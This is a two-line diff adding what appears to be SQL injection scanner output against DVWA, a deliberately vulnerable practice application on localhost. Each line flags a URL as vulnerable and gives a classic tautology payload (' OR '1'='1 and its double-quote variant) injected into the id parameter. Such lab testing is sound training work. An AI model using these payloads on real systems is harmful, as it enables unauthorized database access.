@@ -1,0 +1,2 @@
+VULNERABLE:  http://localhost/dvwa/vulnerabilities/sqli/?id=' OR '1'='1&Submit=Submit | Payload: ' OR '1'='1
+VULNERABLE:  http://localhost/dvwa/vulnerabilities/sqli/?id=" OR "1"="1&Submit=Submit | Payload: " OR "1"="1
